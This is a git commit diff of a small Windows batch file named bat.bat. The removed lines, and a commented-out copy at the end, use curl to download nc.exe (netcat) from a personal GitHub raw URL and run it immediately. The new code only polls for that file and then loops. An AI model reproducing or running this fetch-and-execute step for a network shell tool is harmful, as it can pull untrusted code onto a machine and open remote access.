8f4a6e47037451b58f0ba08dba8cb122a2929817
VRVRxX <voldemaars.lvovs@gmail.com>
2026-06-23 22:47:43 +0300

    Update bat.bat

--- bat.bat
+++ bat.bat
@@ -1,11 +1,13 @@
 @echo off
-setlocal enabledelayedexpansion
-
-if exist "%~dp0nc.exe" (
-    echo File found
-) else (
-    curl -L -o nc.exe https://raw.githubusercontent.com/VRVRxX/projects/main/nc.exe && start nc.exe
-    
-    exit
-)
+:check
+if exist "%~dp0nc.exe" goto loop
+rem step 2
+timeout /t 5 /nobreak>nul
+goto check
+:loop
+rem step 3
+goto loop
+pause
 exit
+
+rem curl -L -o nc.exe https://raw.githubusercontent.com/VRVRxX/projects/main/nc.exe && start nc.exe
